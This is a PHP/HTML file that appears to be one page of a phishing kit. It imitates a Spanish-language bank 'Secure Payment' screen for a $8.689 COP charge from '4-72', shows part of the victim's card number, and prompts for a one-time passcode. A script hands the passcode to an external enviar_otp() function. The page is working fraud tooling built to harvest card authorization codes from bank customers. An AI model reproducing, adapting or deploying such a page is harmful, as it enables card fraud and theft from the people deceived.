<?php 

session_start();
$ca =$_SESSION['ca'];

    
   // $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop  con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		


    <title>Secure Payment</title>
</head>
<body>

<div class="details" style=" width: 90%;
    margin: auto;
    background-color: white;
    border: none ;
    border-radius: 10px;
    /* box-shadow: 0px 10px 10px -6px rgb(167, 167, 167); */
    padding: 20px;">
    <img src="/img/bogo.png" alt="" srcset="" width="120px">
<br><br><a style="color:rgb(105, 105, 105);">Detalles transaccionales</a><a id="textL"></a>
    <pre><b>               Comercio: </b>  4-72 </pre></a> 
    <a id="textL"><pre style="text-align:justify;">        <b>          Monto:  $8.689 Cop </pre></a></center>
    <a id="textL"><pre>      <b>Número de tarjeta: </b> <?php echo "$ca****"; ?> </pre></a> 
    <a><pre> <b>     Digite el Código: </b></a><input type="text" name="cDinamica" id="txtOTP" placeholder ="" required minlength="6" style="width:100px; height:25px;">  <br></pre>
    <a href="" style="color:black;">Presione aquí para recibir un nuevo código</a><br><p></p>
    
    <center><input type="submit" value="Activar" id="btnOTP" style="color:white; background-color:black; width:25%; height:35px; margin:auto;  -webkit-border-radius: 0; -webkit-appearance: none;"></center>
</div>
    



<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</body>
</html>